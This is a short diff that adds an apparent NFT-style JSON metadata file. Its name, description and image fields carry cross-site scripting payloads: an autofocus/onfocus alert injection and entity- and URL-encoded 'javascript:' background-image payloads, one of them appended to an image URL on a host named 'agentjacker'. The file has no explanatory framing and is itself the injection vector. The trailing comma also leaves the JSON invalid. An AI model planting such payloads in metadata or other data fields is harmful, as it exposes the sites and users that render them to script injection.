@@ -1,0 +1,6 @@
+{
+  "name": "<K/contentEditable/autoFocus/OnFocus=(alert)(1)>",
+  "description": "&amp;quot;&amp;gt;&amp;lt;div%20style%3D%22background-image%3A%20url(javascript:alert('XSS'))%3B%22&amp;gt;XSS&amp;lt;/div&amp;gt;",
+  "image": "https://agentjacker.github.io/kittycat.png/|&amp;quot;&amp;gt;&amp;lt;div%20style%3D%22background-image%3A%20url(javascript:alert('XSS'))%3B%22&amp;gt;XSS&amp;lt;/div&amp;gt;",
+  "external_url": "https://agentjacker.github.io/kittycat.png",
+}
